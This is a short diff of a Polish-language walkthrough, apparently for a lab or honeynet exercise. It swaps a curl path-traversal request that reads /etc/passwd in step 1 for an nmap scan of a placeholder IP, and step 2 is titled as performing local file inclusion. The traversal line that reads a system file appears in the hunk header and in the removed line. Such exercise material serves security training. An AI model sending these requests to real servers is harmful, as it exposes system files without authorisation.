@@ -103,7 +103,7 @@ curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd
 
 1. Znajdź serwer WWW
 ```
-curl --insecure https://<Point IP>/\?filename\=../../../etc/passwd 
+sudo nmap -sS -sC -p80,443 <Honeynet IP> -vvv
 ```
 2. Wykonaj LFI
 ```
